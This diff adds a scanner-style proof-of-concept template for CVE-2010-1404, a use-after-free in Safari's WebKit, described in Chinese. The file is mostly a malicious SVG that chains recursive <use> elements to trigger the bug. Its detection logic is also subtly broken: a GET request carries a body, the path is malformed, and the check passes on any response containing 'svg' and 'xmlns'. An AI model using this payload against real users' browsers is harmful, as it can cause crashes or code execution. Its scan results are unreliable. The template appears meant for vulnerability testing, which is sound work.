@@ -1,0 +1,47 @@
+[info]
+author = "ave"
+description = "通过构造包含递归 Use 元素的恶意 SVG 文档，触发 Apple Safari WebKit 渲染引擎的释放后重用漏洞。当用户使用受影响版本 Safari 访问该页面时，WebKit 在页面析构过程中未能正确处理递归 Use 元素，导致已释放内存被再次引用，可造成任意代码执行或崩溃。"
+id = "POC-AVE-2010-0148"
+name = "Apple Safari WebKit SVG Recursive Use Element Use-After-Free PoC"
+severity = "critical"
+tags = ["ave-2010-0148"]
+vuln_id = [
+    "CVE-2010-1404",
+    "AVE-2010-0148",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-2010-1404-poc.svg"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
+  <defs>
+    <rect id="r1" width="50" height="50" fill="red"/>
+    <use id="r2" xlink:href="#r1"/>
+    <use id="r3" xlink:href="#r2"/>
+    <use id="r4" xlink:href="#r3"/>
+    <use id="r5" xlink:href="#r4"/>
+    <use id="r6" xlink:href="#r5"/>
+    <use id="r7" xlink:href="#r6"/>
+    <use id="r8" xlink:href="#r7"/>
+    <use id="r9" xlink:href="#r8"/>
+    <use id="r10" xlink:href="#r9"/>
+  </defs>
+  <use xlink:href="#r10" x="10" y="10"/>
+</svg>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "svg",
+    "xmlns",
+]
